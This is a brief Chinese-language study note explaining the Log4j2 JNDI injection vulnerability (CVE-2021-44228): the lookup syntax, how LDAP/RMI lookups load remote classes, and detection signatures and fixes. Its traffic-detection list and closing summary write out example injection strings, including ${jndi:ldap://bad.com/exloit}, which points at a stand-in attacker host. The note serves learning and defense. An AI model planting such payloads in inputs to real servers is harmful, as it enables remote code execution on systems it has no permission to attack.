Log4j2_JNDI注入

前置

  • Log4j 是一个由 Apache 软件基金会开发的、开源的、基于 Java 的日志记录工具。
  • 在几乎所有的 Java 应用和框架（如 Spring Boot、Apache Struts、Minecraft 等）中，Log4j 都被用于记录系统运行中的各种信息，包括错误消息、用户输入、调试信息等。

log4j2支持lookup功能（查找搜索），设计之初的目的也是为了方便开发者调用。结构就是$ { }

Log4j 2 的 Lookup 语法统一为：

\text{${prefix:key}}

  • prefix： 决定了查找的类型和数据的来源（如系统属性、环境变量、日期等）。
  • key： 是在这个特定来源下要查找的具体项（如属性名、日期格式等）。

常见的几种lookup

  • LDAP（轻型目录访问协议）：是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问 控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈 树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。
  • RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。

漏洞本质 CVE-2021-44228

Lookup功能下的Jndi模块出现问题就是这个漏洞的本质
JNDI (Java Naming and Directory Interface) Lookup是 Java 提供的一个 API，用于查找和访问各种命名和目录服务（如 LDAP、RMI、DNS 等）。

JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。

调用后java将从指定url下载二进制字节流，随后反序列化为java对象并返回

因此 只要攻击者能控制日志打印的内容，就能控制服务器调用JNDI
刚好，大部分web服务程序都会对用户输入进行日志记录。
所以找到这个会写入日志的参数，写入jndi，就让服务器去读取恶意文件了

检测和修复

  • 流量特征：
    • 请求包中包含 ${jndi:ldap:// 或 ${jndi:rmi://。
    • 混淆绕过： 攻击者会变形，比如 ${${lower:j}ndi:...}。在流量分析时，要看有没有类似 jndi、ldap 的关键词组合。
    • 检测敏感端口连接TCP/389 (LDAP), TCP/1389 (LDAPS), TCP/1099 (RMI), UDP/53 (DNS)
  • 怎么修：
    • 升级至没有JNDI功能的版本（>=2.16)
    • 在配置糊环境变量中禁用 JNDI lookup。
    • 直接删除JndiLookup.class 文件

总结

Log4j2的漏洞就在于 这个日志记载工具有lookup功能且JNDI模块可出网并解析文件
那只要找到能写入日志的地方，写入${jndi:ldap://bad.com/exloit}，利用工具构造危险代码，就能强迫目标机执行。
